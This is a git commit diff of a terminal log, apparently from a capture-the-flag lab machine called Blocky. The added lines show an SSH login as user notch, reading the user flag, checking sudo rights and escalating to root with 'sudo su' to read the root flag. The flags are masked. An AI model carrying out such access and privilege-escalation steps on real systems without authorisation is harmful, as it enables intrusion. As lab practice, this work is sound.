963f335e9b43147e87f0e3799fb8302987aed886
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-04-28 13:17:25 -0400

    Update asNotch.bash

--- Blocky/asNotch.bash
+++ Blocky/asNotch.bash
@@ -1,8 +1,4 @@
-allenwest1@debian:~/Desktop/blocky/com/myfirstplugin$ ssh notch@10.10.10.37
-The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.
-ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts.
+allenwest1@debian:~$ ssh notch@10.10.10.37
 notch@10.10.10.37's password: 
 Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 
@@ -14,4 +10,24 @@ Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 7 updates are security updates.
 
 
-Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
+Last login: Tue Apr 28 12:03:29 2020 from 10.10.14.13
+notch@Blocky:~$ ls
+minecraft  user.txt
+notch@Blocky:~$ cat user.txt 
+********************************
+notch@Blocky:~$ sudo -l
+[sudo] password for notch: 
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+notch@Blocky:~$ sudo su
+root@Blocky:/home/notch# whoami
+root
+root@Blocky:/home/notch# cd ../../
+root@Blocky:/# cd root/
+root@Blocky:~# ls
+root.txt
+root@Blocky:~# cat root.txt
+********************************
